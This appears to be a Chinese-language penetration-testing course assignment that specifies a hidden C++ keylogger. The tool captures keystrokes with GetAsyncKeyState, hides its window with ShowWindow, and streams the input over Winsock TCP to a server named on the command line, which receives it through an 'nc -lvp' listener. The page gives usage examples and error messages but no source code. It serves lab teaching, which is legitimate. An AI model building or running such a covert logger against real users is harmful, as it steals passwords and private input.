## 任务 2：创建一个简单的键盘记录器，将所有收集到的信息发送回渗透测试人员

使用 C++ 编写一个隐蔽运行的程序，收集用户的击键并通过网络将它们发送回选择的地址。

**提示**：

- 您可能希望利用`ShowWindow()`函数对目标隐藏窗口。
- 对于这个工具的联网能力，如果使用 TCP 连接会更简单。利用`Winsock`库。
- 对于捕获键，您可能需要使用`GetAsyncKeyState()`函数。
- 对于接收数据，您可以使用 netcat 或 ncat 之类的工具 - 不要自己编写。
- 您可以将通过 RDP 连接的机器用作受害者机器。您不需要将创建的键盘记录程序发送到其他任何地方。

**文件名：**`keylog.cpp`

**用法：**`keylog.exe server-name`

**用法详解：**

* 当不传入任何命令参数时，程序会提示用户正确的用法。

  输入：`keylog.exe`

  输出：`usage: keylog.exe server-name`

* 传入一个命令参数，为服务器的域名或者是IP地址。程序会将用户在正在使用的进程中的输入内容发送到服务器。

  输入：`keylog.exe 192.168.248.129`，或者是`keylog.exe www.baidu.com` 

* 在源码中，将默认端口修改为服务器监听的端口：

  ```cpp
  #define DEFAULT_PORT "27015"
  ```

  在服务器上进行监听

  ```shell	
  nc -lvp 27015
  ```

* 在源码中，可以选择窗口为（可见/不可见）

  ```cpp
  #define visible // (visible / invisible)
  ```

* 当服务器关闭监听的端口，客户端会看到如下提示：

  ```shell
  [ERROR] send failed with error: 10053
  
  [WARING] The server has stopped listening on the port! The program will exit.
  ```

**环境要求：**以下代码在Visual Studio 2019 16.10 ，C++ 语言标准：默认(ISO C++14 标准)测试通过。

**缺点：**没有将WINSOCK功能进行单独封装。

